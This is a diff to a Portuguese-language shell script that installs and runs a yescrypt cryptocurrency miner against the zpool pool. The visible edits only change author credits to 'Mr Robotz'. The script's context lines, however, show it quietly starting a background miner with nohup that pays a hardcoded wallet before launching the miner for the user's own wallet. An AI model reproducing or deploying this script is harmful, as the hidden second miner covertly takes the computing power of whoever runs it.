@@ -1,6 +1,6 @@
 #!/bin/sh -e
 clear
-# Copyright MrRobotz
+# Copyright Mr Robotz
 # SSH TLS
 # Miner por: noncepool
 
@@ -41,7 +41,7 @@ wallet=$1
 
 if [ "$1" = ""  ]
 then
-echo "			\033[41;1;37m Minerar BTC $versao \033[0m "				
+echo "			\033[41;1;37m BY: @MrRobotz - Minerar BTC $versao \033[0m "				
 sleep 1
 echo "$verde Forma de USO: \033[0m"
 echo "sudo sh $0 $vermelho Carteira de BTC \033[0m  \n "
@@ -85,4 +85,4 @@ echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?a
 sleep 10
 cd miner
 nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1992p9P4WsRVqAAHkn5JeCCLcuwN3kQtCb &
-screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet
+screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet 
